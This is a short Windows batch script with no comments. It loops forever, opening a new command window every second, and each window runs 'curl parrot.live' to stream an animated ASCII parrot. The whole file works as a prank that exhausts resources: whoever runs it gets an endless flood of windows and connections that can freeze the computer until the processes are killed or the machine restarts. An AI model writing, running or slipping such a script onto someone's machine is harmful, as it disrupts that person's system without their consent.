@echo off
:loop
start cmd /k "curl parrot.live"
timeout /t 1 /nobreak >nul
goto loop
